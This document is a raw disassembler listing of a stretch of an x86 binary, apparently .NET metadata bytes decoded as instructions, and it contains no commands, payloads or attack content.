  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 28 13 84    	add    %dl,-0x7becd800(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 c4 17 89    	add    %dl,-0x76e83c00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 65 05 0a    	add    %dl,0xa056500(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 e9                	add    %ch,%cl
  40637f:	24 94                	and    $0x94,%al
  406381:	00 10                	add    %dl,(%eax)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 e8                	add    %ch,%al
  40638d:	00 58 00             	add    %bl,0x0(%eax)
  406390:	11 00                	adc    %eax,(%eax)
  406392:	5c                   	pop    %esp
  406393:	30 00                	xor    %al,(%eax)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 18 13 9a    	add    %dl,-0x65ece800(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 0e 06 9a    	add    %dl,-0x65f9f200(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 0a 1e 0a    	add    %dl,0xa1e0a18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 32                	add    %dh,(%edx)
  4063c5:	02 0a                	add    (%edx),%cl
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	04 1e                	add    $0x1e,%al
  4063d4:	0e                   	push   %cs
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 ef 08 0a    	add    %dl,0xa08ef00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 28 19 1d    	add    %dl,0x1d192800(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 bd 1b 1d    	add    %dl,0x1d1bbd00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 1b 06 1d    	add    %dl,0x1d061b00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 d9                	add    %bl,%cl
  406419:	07                   	pop    %es
  40641a:	1d 00 14 00 20       	sbb    $0x20001400,%eax
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 8d 04 1d 00 14    	add    %cl,0x14001d04(%ebp)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	04 1e                	add    $0x1e,%al
  406436:	0e                   	push   %cs
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 7f 15             	add    %bh,0x15(%edi)
  406444:	c3                   	ret
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 fe                	add    %bh,%dh
  406451:	23 c7                	and    %edi,%eax
  406453:	00 14 00             	add    %dl,(%eax,%eax,1)
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 b3 09 53 00 15    	add    %dh,0x15005309(%ebx)
  406463:	00 7b 21             	add    %bh,0x21(%ebx)
  406466:	00 00                	add    %al,(%eax)
  406468:	00 00                	add    %al,(%eax)
  40646a:	96                   	xchg   %eax,%esi
  40646b:	00 9c 01 1d 00 15 00 	add    %bl,0x15001d(%ecx,%eax,1)
  406472:	18 39                	sbb    %bh,(%ecx)
  406474:	00 00                	add    %al,(%eax)
  406476:	00 00                	add    %al,(%eax)
  406478:	96                   	xchg   %eax,%esi
  406479:	00 0c 09             	add    %cl,(%ecx,%ecx,1)
  40647c:	0a 00                	or     (%eax),%al
  40647e:	15 00 90 39 00       	adc    $0x399000,%eax
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 e8 15 c3    	add    %dl,-0x3cea1800(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 63 02 d5    	add    %dl,-0x2afd9d00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 30 04 0a    	add    %dl,0xa043000(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 44 01 c3    	add    %dl,-0x3cfebc00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 ee 14 1d    	add    %dl,0x1d14ee00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 68 08 0a    	add    %dl,0xa086800(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 da    	add    %al,-0x25df6a00(%eax)
  4064dd:	05 e0 00 16 00       	add    $0x1600e0,%eax
  4064e2:	00 00                	add    %al,(%eax)
  4064e4:	00 00                	add    %al,(%eax)
  4064e6:	80 00 96             	addb   $0x96,(%eax)
  4064e9:	20 ce                	and    %cl,%dh
  4064eb:	03 e4                	add    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 29    	add    %al,0x29209600(%eax)
  4064f9:	16                   	push   %ss
  4064fa:	ec                   	in     (%dx),%al
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 fa    	add    %al,-0x5df6a00(%eax)
  406507:	01 f1                	add    %esi,%ecx
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 93    	add    %al,-0x6cdf6a00(%eax)
  406515:	06                   	push   %es
  406516:	f8                   	clc
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 61 1a             	and    %ah,0x1a(%ecx)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 37 25 1c    	add    %dl,0x1c253700(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 6c 1a 0a    	add    %dl,0xa1a6c00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 e4                	add    %ah,%ah
  40654d:	04 0a                	add    $0xa,%al
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 30 03 23    	add    %dl,0x23033000(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  40656a:	2a 01                	sub    (%ecx),%al
  40656c:	24 00                	and    $0x0,%al
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 e5 05 84    	add    %dl,-0x7bfa1b00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 d6 18 1d    	add    %dl,0x1d18d600(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 0a 1e 0a    	add    %dl,0xa1e0a18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 af 06 9a    	add    %dl,-0x65f95100(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 77 12             	add    %dh,0x12(%edi)
  4065b0:	38 01                	cmp    %al,(%ecx)
  4065b2:	27                   	daa
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 7d 07 0a    	add    %dl,0xa077d00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 22 05 3e    	add    %dl,0x3e052200(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 0a                	sbb    %cl,(%edx)
  4065d9:	1e                   	push   %ds
  4065da:	0a 00                	or     (%eax),%al
  4065dc:	29 00                	sub    %eax,(%eax)
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	04 1e                	add    $0x1e,%al
  4065e8:	6b 01 29             	imul   $0x29,(%ecx),%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	fc                   	cld
  4065f5:	16                   	push   %ss
  4065f6:	70 01                	jo     0x4065f9
  4065f8:	2a 00                	sub    (%eax),%al
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	7f 26                	jg     0x40662a
  406604:	75 01                	jne    0x406607
  406606:	2b 00                	sub    (%eax),%eax
  406608:	6e                   	outsb  %ds:(%esi),(%dx)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 96 15 70    	add    %al,0x70159600(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 e9 01 75    	add    %al,0x7501e900(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 fb 1a 7c 01    	addl   $0x17c1afb,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 0a 1e 0a    	add    %dl,0xa1e0a18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 c2                	add    %al,%dl
  406649:	01 c7                	add    %eax,%edi
  40664b:	00 30                	add    %dh,(%eax)
  40664d:	00 40 45             	add    %al,0x45(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 f4                	add    %dh,%ah
  406657:	00 84 01 31 00 9f 22 	add    %al,0x229f0031(%ecx,%eax,1)
  40665e:	00 00                	add    %al,(%eax)
  406660:	00 00                	add    %al,(%eax)
  406662:	96                   	xchg   %eax,%esi
  406663:	00 35 24 2a 01 32    	add    %dh,0x32012a24
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 f6                	add    %dh,%dh
  406673:	24 93                	and    $0x93,%al
  406675:	01 33                	add    %esi,(%ebx)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 07 04 93    	add    %dl,-0x6cfbf900(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 b4 04 93 01 35 00 	add    %dh,0x350193(%esp,%eax,1)
  406694:	10 46 00             	adc    %al,0x0(%esi)
  406697:	00 00                	add    %al,(%eax)
  406699:	00 96 00 bc 06 84    	add    %dl,-0x7bf94400(%esi)
  40669f:	01 36                	add    %esi,(%esi)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 9b 05 99    	add    %dl,-0x66fa6500(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 dc 02 9f    	add    %dl,-0x60fd2400(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 60 0a a5    	add    %dl,-0x5af5a000(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 02 1c ab    	add    %dl,-0x54e3fe00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	04 1e                	add    $0x1e,%al
  4066e4:	0e                   	push   %cs
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 0a 1e 0a    	add    %dl,0xa1e0a18(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 04 1e b1    	add    %al,-0x4ee1fbe8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 67 22             	or     %esp,0x22(%edi)
  40670e:	bb 01 3c 00 40       	mov    $0x40003c01,%ebx
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 25 23 bf 01 3c    	add    %esp,0x3c01bf23
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	8e 21                	mov    (%ecx),%fs
  40672a:	0e                   	push   %cs
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 04 1e cb    	add    %al,-0x34e1fbe8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 72 15 d7    	add    %al,-0x28ea8e00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 6f 02 dc    	add    %al,-0x23fd9100(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 fc 08 e2    	add    %al,-0x1df70400(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 a7 05 e8    	add    %al,-0x17fa5900(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 19 18 ee    	add    %al,-0x11e7e6f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	67 15 f4 01 42 00    	addr16 adc $0x4201f4,%eax
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 20 07 6b 01    	addl   $0x16b0720,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 3c 07 0e 00    	addl   $0xe073c,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 3e 02 d7 01    	addl   $0x1d7023e,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 8c 26 0a 02    	addl   $0x20a268c,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	c3                   	ret
  4067d1:	04 dc                	add    $0xdc,%al
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 7f 04 d7    	add    %al,-0x28fb8100(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 6c 16 d7    	add    %al,-0x28e99400(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 cd 12 d7    	add    %al,-0x28ed3300(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 b1 07 0f 02    	addl   $0x20f07b1,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 ab 00 0f 02    	addl   $0x20f00ab,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	73 1e                	jae    0x406844
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 8a 1d 1a    	add    %al,0x1a1d8a00(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 06 08 1f    	add    %al,0x1f080600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	e7 09                	out    %eax,$0x9
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	63 04 27             	arpl   %eax,(%edi,%eiz,1)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	3d 18 2b 02 49       	cmp    $0x49022b18,%eax
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	e1 25                	loope  0x40689f
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 15 08 36    	add    %al,0x36081500(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 42 09             	add    %al,0x9(%edx)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 25 02 42    	add    %al,0x42022500(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 e0 26 42    	add    %al,0x4226e000(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	27                   	daa
  4068bf:	09 dc                	or     %ebx,%esp
  4068c1:	01 50 00             	add    %edx,0x0(%eax)
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	9c                   	pushf
  4068cd:	00 0e                	add    %cl,(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 70 05 6b    	add    %al,0x6b057000(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 b3 26 47    	add    %al,0x4726b300(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 f2 09 4b    	add    %al,0x4b09f200(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	e3 14                	jecxz  0x40691a
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	ca 18 55             	lret   $0x5518
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	be 15 2b 02 55       	mov    $0x55022b15,%esi
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	72 04                	jb     0x406934
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	4a                   	dec    %edx
  40693d:	03 0f                	add    (%edi),%ecx
  40693f:	02 57 00             	add    0x0(%edi),%dl
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	59                   	pop    %ecx
  40694b:	1b 31                	sbb    (%ecx),%esi
  40694d:	02 58 00             	add    0x0(%eax),%bl
  406950:	c8 53 00 00          	enter  $0x53,$0x0
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	4f                   	dec    %edi
  406959:	05 0f 02 58 00       	add    $0x58020f,%eax
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	10 14 47             	adc    %dl,(%edi,%eax,2)
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	1d 14 6b 01 59       	sbb    $0x59016b14,%eax
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	ee                   	out    %al,(%dx)
  406983:	1c 23                	sbb    $0x23,%al
  406985:	02 5a 00             	add    0x0(%edx),%bl
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	fc                   	cld
  406991:	1c 15                	sbb    $0x15,%al
  406993:	02 5a 00             	add    0x0(%edx),%bl
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
